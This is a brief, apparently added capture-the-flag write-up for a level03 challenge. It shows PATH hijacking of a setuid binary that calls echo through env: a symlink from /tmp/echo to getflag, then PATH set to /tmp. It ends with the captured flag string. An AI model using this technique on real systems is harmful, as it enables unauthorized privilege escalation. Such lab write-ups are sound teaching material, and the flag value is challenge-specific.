@@ -1,0 +1,11 @@
+1. there is binary level03 in this level, run the binary, it prints " Exploit me"
+2. strings level03 | grep Exploit have the following result:
+	/usr/bin/env echo Exploit me
+3. with strings level03 we can see this program is change the uid in run time(probabely more rights)
+3. the program use echo from Path of the env, then try to creat a fake echo, change the path, since our aim is to run getfalg to get the flag, then we try to make a symblick link with the fake echo
+4. which getfalg we have /bin/getflag
+5. ln -s /bin/getflag /tmp/echo
+6. export PATH=/tmp
+7. ./level03 we got the flag
+	qi0maab88jeaj46qoumi7maus
+
